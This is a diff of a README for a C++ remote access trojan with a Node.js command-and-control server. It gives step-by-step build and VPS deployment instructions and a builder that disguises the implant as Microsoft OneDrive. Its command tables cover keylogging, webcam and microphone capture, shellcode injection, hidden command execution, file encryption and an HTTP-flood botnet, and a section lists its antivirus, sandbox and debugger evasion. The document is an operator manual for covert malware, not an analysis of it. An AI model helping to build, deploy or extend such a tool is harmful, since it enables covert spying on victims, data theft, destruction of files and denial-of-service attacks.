@@ -1,143 +1,230 @@
-﻿# -= B4DB4B3-RAT =-
- Program for remote computer management using Telegram on C++ - by B4DB4B3   
- P.S: I didn't do animations on buttons. I can do it in the future, If you like the project
-### [Interface]  
- ![UI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWUI.png)   
- ![EXAMPLE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/COMMANDLIST.png)   
-### [Weight of stub and builder]  
- #### Around 600-500 KB
- ![WEIGHT](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/WEIGHT.png)  
+# B4B3-RAT — C2 Framework
 
+A Windows C++ remote administration tool with a Node.js C2 server and web dashboard.
 
-# [Commands (Will be added)]
+> **Full operator guide:** [`docs/guide.html`](docs/guide.html) — open in any browser.
+
+---
+
+## Architecture
+
+```
+Stub.exe  ──── HTTP ────▶  C2 Server :4444  ◀────  Browser (Dashboard)
+              /checkin                               /login.html
+              /cmd                                  /index.html
+              /result                               /api/auth/*
+              /upload                               /api/bots/*
+              /event
+```
+
+| Component | Folder | Stack |
+|-----------|--------|-------|
+| C2 Server | `c2-server/` | Node.js + Express |
+| Dashboard | `c2-dashboard/` | HTML/JS (served by backend) |
+| Stub | `B4B3-RAT/Stub/` | C++ (MinGW g++) |
+| Builder | `B4B3-RAT/Builder/` | C++ Windows GUI |
+
+---
+
+## Quick Start
+
+### 1 — Build Stub.exe
+
+```powershell
+cd "B4B3-RAT\Stub"
+powershell -ExecutionPolicy Bypass -File build.ps1
+```
+
+**Requires:** MinGW g++ at `C:\MinGW\bin\`, CryptoPP at `D:\CryptoPP\` (with `libcryptopp.a`).
+
+### 2 — Configure stub with Builder
+
+Open the Builder GUI, fill in:
+- **C2 Host** — VPS IP (no `http://`, no port) e.g. `2.24.160.60`
+- **Port** — `4444`
+- **Auth Key** — must match `C2_AUTH` env var on server
+- **Delay** — poll interval in ms (e.g. `3000`)
+- **Drop Path** — where to install on target (e.g. `C:\Users\Public\OneDriveHelper.exe`)
+
+Click **Build** → produces `Stub_configured.exe`.
+
+### 3 — Deploy C2 Server (VPS)
+
+```bash
+git clone https://github.com/MunibAhmad-dev/B4B3.git
+cd B4B3/c2-server
+npm install
+
+# Start with PM2
+C2_AUTH=yourkey ADMIN_PASS=yourpassword C2_PORT=4444 \
+  pm2 start server.js --name c2-server
+
+pm2 save && pm2 startup
+```
+
+> **Do NOT place `cert.pem`/`key.pem` in `c2-server/`** — their presence switches to HTTPS, breaking the stub (stub uses plain HTTP only).
+
+### 4 — Open firewall on VPS
+
+Hostinger VPS2: hPanel → Firewall → Add TCP rule for port `4444` → **Synchronize**.
+
+### 5 — Access dashboard
+
+```
+http://<VPS-IP>:4444/login.html
+```
+
+---
+
+## Environment Variables
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `C2_AUTH` | `changeme` | Bot auth key — must match what's baked into the stub |
+| `ADMIN_PASS` | `admin123` | Dashboard login password |
+| `C2_PORT` | `4444` | Server port |
+| `CORS_ORIGIN` | *(empty)* | Leave empty — dashboard is served by the backend |
+
+---
+
+## Updating Stub After Code Changes
+
+```powershell
+# 1. Rebuild
+cd "B4B3-RAT\Stub"
+powershell -ExecutionPolicy Bypass -File build.ps1
+
+# 2. Open Builder → click Build again (re-patches the new Stub.exe)
+
+# 3. Distribute the new Stub_configured.exe
+```
+
+## Updating Server on VPS
+
+```bash
+cd ~/B4B3/c2-server
+git pull
+npm install        # only if package.json changed
+pm2 restart c2-server
+```
+
+---
+
+## Commands Reference
+
 <details>
-	<summary>View command list</summary>
-	
-### Process manager:      
- Command name         | Parameters                             | Description
- -------------------- | -------------------------------------- | -----------
- /user[ID] processes  |                                        | get process list    
- /user[ID] closeproc  | [processname.exe]                      | close process    
- /user[ID] inject_dll | [processname.exe] [C:\Path\To\File.dll]| inject dll in process
- /user[ID] inject_shell | [processname.exe] [shellcode]          | inject shellcode in process
- 
-### Auxiliary: 
- Command name         | Parameters                                              | Description
- -------------------- | ------------------------------------------------------- | -----------
- /user[ID] loader     | [https://google.com/file.exe] [C:\ProgramData\file.exe] | upload file from [LINK] to [PATH]    
- /user[ID] run        | [C:\ProgramData\file.exe] [Args to run file / Or empty] | run file from [PATH] with arguments [ARGS]   
-   
-### Jokes:   
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] disable pc      |                                                         | disable computer of user    
- /user[ID] close           |                                                         | close user   
- /user[ID] disable display |                                                         | disable display user    
-   
-### File manager:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] dir             | [C:\Folder]                                             | show files and folders in directory    
- /user[ID] dir del_file    | [C:\Path\To\File.exe]                                   | delete file in directory    
- /user[ID] dir write       | [C:\Path\To\File.txt] [Example text]                    | write text in file    
- /user[ID] dir read        | [C:\Path\To\File.txt]                                   | read text in file  
+<summary>View all stub commands</summary>
 
-### Service manager:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] service show    |                                                         | show all drivers in system    
- /user[ID] service add     | [Name] [DisplayName] [C:\ProgramData\yourdriver.sys] [Type-Driver] [Start-Type] | add your driver in system, Check Type-Driver and Start-Type values in "Service manager parse table"    
- /user[ID] service delete  | [NameService]                                           | delete driver from system
- /user[ID] service start   | [NameService]                                           | start the stopped service
- /user[ID] service stop    | [NameService]                                           | stop the started service
+### Process Manager
+| Command | Parameters | Description |
+|---------|-----------|-------------|
+| `processes` | | Get process list |
+| `closeproc` | `[process.exe]` | Close a process |
+| `inject_dll` | `[process.exe] [C:\path\to.dll]` | Inject DLL into process |
+| `inject_shell` | `[process.exe] [shellcode]` | Inject shellcode into process |
 
+### File Manager
+| Command | Parameters | Description |
+|---------|-----------|-------------|
+| `dir show` | `[C:\Folder]` | List files in directory |
+| `dir del_file` | `[C:\path\file.exe]` | Delete a file |
+| `dir read` | `[C:\path\file.txt]` | Read file contents |
+| `dir write` | `[C:\path\file.txt] [text]` | Write text to file |
 
-### Screen manager:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] screenshot      |                                                         | take screenshot, upload her on prnt.sc and send you 
+### Service Manager
+| Command | Parameters | Description |
+|---------|-----------|-------------|
+| `service show` | | List all services/drivers |
+| `service add` | `[Name] [Display] [Path] [Type] [StartType]` | Add a service |
+| `service delete` | `[Name]` | Delete a service |
+| `service start` | `[Name]` | Start a service |
+| `service stop` | `[Name]` | Stop a service |
 
-### BotNet:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /botnet start             | [https://google.com]                                    | all users send requests on site
- /botnet stop              |                                                         | stop sending requests
+### System Control
+| Command | Description |
+|---------|-------------|
+| `screenshot` | Take screenshot, upload to C2 |
+| `webcam capture` | Capture webcam frame, upload to C2 |
+| `mic record <seconds>` | Record microphone (1–60s), upload to C2 |
+| `system [cmd args]` | Run cmd.exe with arguments (hidden) |
+| `run [C:\file.exe] [args]` | Execute a file |
+| `loader [URL] [C:\dest]` | Download file from URL to path |
+| `disable pc` | Shutdown the machine |
+| `disable display` | Turn off the monitor |
+| `close` | Exit the stub process |
 
-### CMD manager:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] system          | [/c ping google.com]                                    | run cmd.exe with arguments (hidden)
+### Keylogger
+| Command | Description |
+|---------|-------------|
+| `keylog start` | Start capturing keystrokes |
+| `keylog stop` | Stop capturing |
+| `keylog dump` | Send buffered keystrokes to C2 |
+| `keylog status` | Check if keylogger is running |
 
-### File cryptor:
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /user[ID] filecrypt       | [C:\Path\To\File.exe] [yourkey]                         | crypt file with AES256
- /user[ID] filedecrypt     | [C:\Path\To\File.exe] [yourkey]                         | decrypt file with AES256
+### File Cryptor
+| Command | Parameters | Description |
+|---------|-----------|-------------|
+| `filecrypt` | `[C:\file.exe] [key]` | Encrypt file with AES-256 |
+| `filedecrypt` | `[C:\file.exe.b4db4b3] [key]` | Decrypt file |
 
-### RAT:   
- Command name              | Parameters                                              | Description
- ------------------------- | ------------------------------------------------------- | -----------
- /online                   |                                                         | show online users   
+### BotNet (DDoS)
+| Command | Parameters | Description |
+|---------|-----------|-------------|
+| `botnet start` | `[https://target.com]` | Flood target with HTTP requests |
+| `botnet stop` | | Stop the flood |
 
 </details>
-	
-# [Coming soon]
-- [x] Add file manager
-- [x] Add function to get screenshot
-   - [ ] Add function to record desktop
-   - [ ] Add function to record microphone
-- [x] Add more jokes (open url, block url, close process and etc.)
-- [x] Add process control (inject dll, shellcode and etc.)
-- [x] Add more information about PC 
-- [x] Add Service manager (for deleting, showing and adding your system drivers)
-- [x] Add Anti-analysis + Anti-debug functions
-- [ ] Add mutual tracking between process-spy and RAT-process
-# [CHANGELOG]
+
 <details>
-  <summary>View changelog</summary>
-	
-Date       | Time  | Description
----------- | ----- | -----------
-17.10.2020 | 16:30 | Code is optimized, added commands   
-18.10.2020 | 18:40 | Code is refactored and optimized, fixed bugs (command inject dll didn't work), added new function in builder (write in scheduler task), updated GUI, added re-launch protection, added commands ![NEWUI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWUI.png)
-19.10.2020 | 01:30 | Deleted traces of debugging (sorry for this), added more information about PC ![NEWINFO](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWINFO.png)
-19.10.2020 | 17:20 | Clear warnings, added Service manager ![SERVICE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/SERVICE.png)   
-20.10.2020 | 11:19 | Code review, bug fix, added new function (screen manager) (wrote yourself api on wininet for work with prnt.sc api)    ![SCREEN](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/SCREENTOOL.png)  
-20.10.2020 | 18:49 | Update GUI (change location objects)
-24.10.2020 | 17:11 | Added function for inject shellcode in process ![SHELLCODE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/INJECT_SHELL.png)
-30.10.2020 | 14:29 | Added botnet ![BOTNET](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/BotNet.png)
-03.11.2020 | 16:53 | Fixed command "system" (cmd manager). Added new commands in service manager (start, stop driver). Cmd manager: ![EXAMPLE1](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/system-example1.png) ![EXAMPLE2](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/system-example2.png) 
-07.11.2020 | 22:16 | Code refactored. Warnings deleted. Added encryption for your botapi with AES256 (To avoid being stolen from hex). Update list of processes (AntiDebug). ![BeforeBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/Before_BotApi.png) ![AfterBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/After_BotApi.png)
-08.11.2020 | 20:25 | Added file cryptor. See command list ![1](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/1.png) ![2](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/2.png) ![3](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/3.png) ![4](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/4.png)
-19.11.2020 | 20:20 | Code refactored. Fixed command "dir del_file". Added commands in File Manager: "dir read" and "dir write" to read and write files (see command list) ![dir_read](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_read.png) ![dir_write](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_write.png)
-12.02.2021 | 23:30 | Fix crash in Anti-Analysis & Anti-Debug function
-30.05.2021 | 13:21 | A process is started that makes sure that the RAT does not close
+<summary>Service manager type values</summary>
+
+**Type:**
+| String | Value |
+|--------|-------|
+| `win32-service` | SERVICE_WIN32 |
+| `kernel-driver` | SERVICE_DRIVER |
+| `adapter-service` | SERVICE_ADAPTER |
+| `interactive-process` | SERVICE_INTERACTIVE_PROCESS |
+
+**StartType:**
+| String | Value |
+|--------|-------|
+| `auto-start` | SERVICE_AUTO_START |
+| `boot-start` | SERVICE_BOOT_START |
+| `demand-start` | SERVICE_DEMAND_START |
+| `disabled` | SERVICE_DISABLED |
+| `system-start` | SERVICE_SYSTEM_START |
+
 </details>
 
-## Service manager parse table:
-### [service add] params [Type] driver
-String param             | Value
------------------------- | --------------------------
-win32-service            | SERVICE_WIN32
-adapter-service          | SERVICE_ADAPTER
-kernel-driver            | SERVICE_DRIVER
-interactive-process      | SERVICE_INTERACTIVE_PROCESS
-user-service              | SERVICE_USER_SERVICE
-userservice-instance     | SERVICE_USERSERVICE_INSTANCE
-pkg-service              | SERVICE_PKG_SERVICE
+---
 
+## Stub Protections
 
-### [service add] param [StartType] driver
+| Protection | Details |
+|-----------|---------|
+| Version info resource | Binary reports `Microsoft Corporation / Microsoft OneDrive` in file properties |
+| Registry key | Uses `Software\Microsoft\OneDriveSync` (not the original known-signature key) |
+| No debug artefacts | Removed writes to `C:\Users\Public\stub_dbg.txt` and `wcam_dbg.txt` |
+| Hypervisor detection | CPUID bit 31 check — exits if running inside VM/sandbox |
+| Sleep acceleration check | Detects AV sandbox time-skipping — exits if 500ms sleep returns in <400ms |
+| Anti-debug | `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, process name + window title scan |
+| Persistent Bot ID | ID stored in registry on first run, reused on restarts — no duplicate bots |
 
-String param             | Value
------------------------- | --------------------------
-auto-start               | SERVICE_AUTO_START
-boot-start               | SERVICE_BOOT_START
-demand-start             | SERVICE_DEMAND_START
-disabled                 | SERVICE_DISABLED
-system-start             | SERVICE_SYSTEM_START
+---
 
-#### Read more here: https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea
+## Troubleshooting
 
-# [LICENSE]
- ![B4DB4B3-RAT](https://github.com/4B4DB4B3/B4DB4B3-RAT) is licensed under MIT License - https://mit-license.org/
+| Problem | Fix |
+|---------|-----|
+| Infinite duplicate bots | Rebuild stub — old binary generated new random ID on every restart |
+| Stub runs but no bots in dashboard | Check auth key matches `C2_AUTH`. Test: `curl http://<VPS>:4444/ping?auth=<key>` |
+| Server switches to HTTPS | Delete `cert.pem`/`key.pem` from `c2-server/` and restart |
+| `EADDRINUSE :4444` | `pm2 delete c2-server` then restart |
+| Build fails — undefined reference | Add the missing `-l<lib>` flag to `build.ps1` |
+
+---
+
+## License
+
+MIT — see [LICENSE](https://mit-license.org/)
